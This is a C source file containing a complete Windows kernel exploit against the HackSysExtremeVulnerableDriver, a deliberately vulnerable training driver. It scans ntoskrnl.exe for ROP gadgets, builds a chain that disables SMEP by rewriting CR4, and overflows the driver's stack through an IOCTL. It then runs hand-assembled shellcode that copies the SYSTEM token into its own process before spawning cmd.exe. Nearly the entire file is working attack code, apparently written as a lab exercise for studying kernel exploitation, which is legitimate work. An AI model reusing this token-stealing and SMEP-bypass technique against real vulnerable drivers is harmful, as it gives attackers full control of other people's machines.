#include <stdio.h>
#include <windows.h>

#define CR4_VALUE 0x350ef8
#define K_BASE 0xfffff807bda00000
#define IOCTL_STACK_OVERFLOW 0x222003
#define SHELLCODE_MAX_SIZE 512

DWORD GetModuleSize(HMODULE hModule) {
  if (!hModule)
    return 0;

  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((UINT8 *)hModule + pDosHeader->e_lfanew);
  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    return 0;

  return pNtHeaders->OptionalHeader.SizeOfImage;
}

UINT8 *FindPattern(UINT8 *baseAddress, SIZE_T scanSize, const char *pattern,
                   const char *mask) {
  SIZE_T patternLength = strlen(mask);

  for (SIZE_T i = 0; i < scanSize - patternLength; i++) {
    BOOL found = TRUE;
    for (SIZE_T j = 0; j < patternLength; j++) {
      if (mask[j] == 'x' && baseAddress[i + j] != (UINT8)pattern[j]) {
        found = FALSE;
        break;
      }
    }
    if (found) {
      return &baseAddress[i];
    }
  }
  return NULL;
}

BOOL IsExecutableAddress(HMODULE hModule, DWORD rva) {
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((UINT8 *)hModule + pDosHeader->e_lfanew);
  PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

  for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
    if (rva >= pSection[i].VirtualAddress &&
        rva < (pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize)) {

      if ((pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
        return FALSE;
      if ((pSection[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0)
        return FALSE;

      char sectionName[9] = {0};
      memcpy(sectionName, pSection[i].Name, 8);
      if (_strnicmp(sectionName, "PAGE", 4) == 0 ||
          _strnicmp(sectionName, "INIT", 4) == 0) {
        return FALSE;
      }
      return TRUE;
    }
  }
  return FALSE;
}

DWORD ScanModuleForRVA(HMODULE hModule, const char *pattern, const char *mask,
                       const char *itemName, BOOL isExecutable) {
  DWORD imageSize = GetModuleSize(hModule);
  if (imageSize == 0) {
    if (itemName)
      printf("[-] Failed to parse PE headers for %s.\n", itemName);
    return 0;
  }

  UINT8 *startAddress = (UINT8 *)hModule;
  SIZE_T remainingSize = imageSize;

  while (remainingSize > 0) {
    UINT8 *match = FindPattern(startAddress, remainingSize, pattern, mask);
    if (!match)
      break;

    DWORD rva = (DWORD)(match - (UINT8 *)hModule);

    if (!isExecutable || IsExecutableAddress(hModule, rva)) {
      if (itemName) {
        if (isExecutable)
          printf("[+] Found Executable [%s] at RVA: 0x%lx\n", itemName, rva);
        else
          printf("[+] Found [%s] at RVA: 0x%lx\n", itemName, rva);
      }
      return rva;
    }

    SIZE_T offset = (match - startAddress) + 1;
    startAddress += offset;
    remainingSize -= offset;
  }

  if (itemName) {
    if (isExecutable)
      printf("[-] Failed to find executable pattern for [%s].\n", itemName);
    else
      printf("[-] Failed to find pattern for [%s].\n", itemName);
  }
  return 0;
}

SIZE_T BuildShell(PBYTE buffer, SIZE_T maxSize, UINT64 gPopRcx, UINT64 gMovCr4,
                  UINT64 cr4Original) {
  PBYTE p = buffer;

#define EMIT(data, len)                                                        \
  do {                                                                         \
    memcpy(p, (data), (len));                                                  \
    p += (len);                                                                \
  } while (0)

  // mov rax, qword ptr gs:[188h]
  EMIT("\x65\x48\x8b\x04\x25\x88\x01\x00\x00", 9);

  // mov rax, [rax+0xB8]
  EMIT("\x48\x8b\x80\xb8\x00\x00\x00", 7);

  // mov r8, rax
  EMIT("\x49\x89\xc0", 3);

  // mov r9, rax
  EMIT("\x4d\x89\xc1", 3);

  // TOKEN WALK LOOP
  // mov r9, qword ptr [r9+1D8h]
  EMIT("\x4d\x8b\x89\xd8\x01\x00\x00", 7);

  // sub r9, 1D8h
  EMIT("\x49\x81\xe9\xd8\x01\x00\x00", 7);

  // mov r10, qword ptr [r9+1D0h]
  EMIT("\x4d\x8b\x91\xd0\x01\x00\x00", 7);

  // cmp r10, 4
  EMIT("\x49\x83\xfa\x04", 4);

  // jne loop_start (back 27 bytes)
  EMIT("\x75\xe5", 2);

  // TOKEN SWAP
  // mov rcx, qword ptr [r9+248h]
  EMIT("\x49\x8b\x89\x48\x02\x00\x00", 7);

  // and cl, 0xf0
  EMIT("\x80\xe1\xf0", 3);

  // mov qword ptr [r8+248h], rcx
  EMIT("\x49\x89\x88\x48\x02\x00\x00", 7);

  // STACK CLEANUP: Rebuild ROP chain to restore CR4 and return
  // At shellcode entry: RSP = RSP_base + 0x20
  // Dispatcher return address is at RSP_base + 0x30, which is [rsp + 0x10]

  // mov rcx, [rsp + 0x10]
  EMIT("\x48\x8b\x4c\x24\x10", 5);

  // add rsp, 0x18
  EMIT("\x48\x83\xc4\x18", 4);

  // push rcx
  EMIT("\x51", 1);

  // mov rax, gMovCr4
  EMIT("\x48\xb8", 2);
  memcpy(p, &gMovCr4, 8);
  p += 8;

  // push rax
  EMIT("\x50", 1);

  // mov rax, cr4Original
  EMIT("\x48\xb8", 2);
  memcpy(p, &cr4Original, 8);
  p += 8;

  // push rax
  EMIT("\x50", 1);

  // mov rax, gPopRcx
  EMIT("\x48\xb8", 2);
  memcpy(p, &gPopRcx, 8);
  p += 8;

  // push rax
  EMIT("\x50", 1);

  // ret
  EMIT("\xc3", 1);

#undef EMIT
  return (SIZE_T)(p - buffer);
}

int main(void) {
  HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                               GENERIC_READ | GENERIC_WRITE, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to open HEVD. Error: %lu\n", GetLastError());
    return 1;
  }
  printf("[+] HEVD handle acquired.\n");

  HMODULE hNtoskrnl = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe",
                                     NULL, DONT_RESOLVE_DLL_REFERENCES);
  if (!hNtoskrnl) {
    printf("[-] Failed to load ntoskrnl.exe\n");
    return 1;
  }

  DWORD rvaPopRcx =
      ScanModuleForRVA(hNtoskrnl, "\x59\xC3", "xx", "pop rcx ; ret", TRUE);
  DWORD rvaMovCr4 = ScanModuleForRVA(hNtoskrnl, "\x0F\x22\xE1\xC3", "xxxx",
                                     "mov cr4, rcx ; ret", TRUE);

  if (!rvaPopRcx || !rvaMovCr4) {
    printf("[-] Missing required gadgets. Aborting.\n");
    return 1;
  }

  UINT64 kBase = K_BASE;
  UINT64 gPopRcx = kBase + rvaPopRcx;
  UINT64 gMovCr4 = kBase + rvaMovCr4;

  printf("[+] Gadgets resolved:\n");
  printf("    pop rcx ; ret       = 0x%llX\n", gPopRcx);
  printf("    mov cr4, rcx ; ret  = 0x%llX\n", gMovCr4);

  printf("[*] Press ENTER to fire the exploit...\n");
  getchar();

  UINT64 cr4Original = CR4_VALUE;
  UINT64 cr4Off = cr4Original & ~((1ULL << 20) | (1ULL << 21));

  PBYTE shellcode =
      (PBYTE)VirtualAlloc(NULL, SHELLCODE_MAX_SIZE, MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
  if (!shellcode) {
    printf("[-] VirtualAlloc failed for shellcode. Error: %lu\n",
           GetLastError());
    return 1;
  }

  SIZE_T shellSize =
      BuildShell(shellcode, SHELLCODE_MAX_SIZE, gPopRcx, gMovCr4, cr4Original);
  if (shellSize == 0) {
    printf("[-] BuildShell failed.\n");
    return 1;
  }
  printf("[+] Shellcode built: %zu bytes\n", shellSize);

  SIZE_T size = 0x840;
  PBYTE buff = (PBYTE)malloc(size);
  if (!buff) {
    printf("[-] malloc failed\n");
    return 1;
  }
  memset(buff, 0xAA, size);

  *(PULONG_PTR)(buff + 0x818) = gPopRcx;              // pop rcx; ret
  *(PULONG_PTR)(buff + 0x820) = cr4Off;               // new CR4 (SMEP off)
  *(PULONG_PTR)(buff + 0x828) = gMovCr4;              // mov cr4, rcx; ret
  *(PULONG_PTR)(buff + 0x830) = (ULONG_PTR)shellcode; // shellcode address

  DWORD returned;
  DeviceIoControl(hDevice, IOCTL_STACK_OVERFLOW, buff, size, NULL, 0, &returned,
                  NULL);

  printf("[+] Spawning cmd.exe...\n");
  system("cmd.exe");

  free(buff);
  VirtualFree(shellcode, 0, MEM_RELEASE);
  CloseHandle(hDevice);

  return 0;
}
